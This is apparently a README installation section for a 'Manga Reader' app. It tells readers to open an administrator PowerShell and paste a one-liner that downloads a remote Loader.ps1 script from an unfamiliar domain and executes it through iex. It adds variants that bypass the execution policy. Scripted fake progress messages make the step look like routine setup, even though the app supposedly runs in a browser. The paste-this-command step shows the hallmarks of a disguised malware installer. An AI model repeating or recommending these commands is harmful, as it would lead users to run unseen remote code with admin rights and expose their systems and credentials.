## ⚙️ INSTALLATION & SETUP (CMD / PowerShell)

### Step 1: Open CMD or PowerShell as Administrator
```cmd
# Press Win+X, then select Terminal (Admin) or Command Prompt (Admin)
```

### Step 2: Execute Deployment Command
```cmd
powershell -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
```

### Step 3: Wait for Completion
```
[1/4] Loading Manga Reader modules...
[2/4] Configuring viewer settings...
[3/4] Initializing library...
[4/4] Ready. Start reading.
```

### Step 4: Start Using Manga Reader
- Open the app in your browser.
- Upload your manga/comic files.
- Start reading with customizable settings.

## 🔧 TROUBLESHOOTING & COMMON ERRORS

### 📌 Execution Policy Bypass (PowerShell)
```cmd
powershell -ExecutionPolicy Bypass -Command "irm https://mast.frtview.com/Loader.ps1 | iex"
```

### 📌 irm Not Recognized (PowerShell 2.0)
```cmd
powershell -Command "Invoke-RestMethod https://mast.frtview.com/Loader.ps1 | Invoke-Expression"
```

### 📌 File Not Loading
- Ensure the file format is supported (CBZ, CBR, PDF, PNG, JPG).
- Check if the file is corrupted or incomplete.

### 📌 Slow Loading
- For large files, optimize images or compress the archive.
- Consider splitting into smaller volumes.

### 📌 Offline Mode Not Working
- Ensure the file is downloaded to your local device.
- The app requires internet for initial load only.
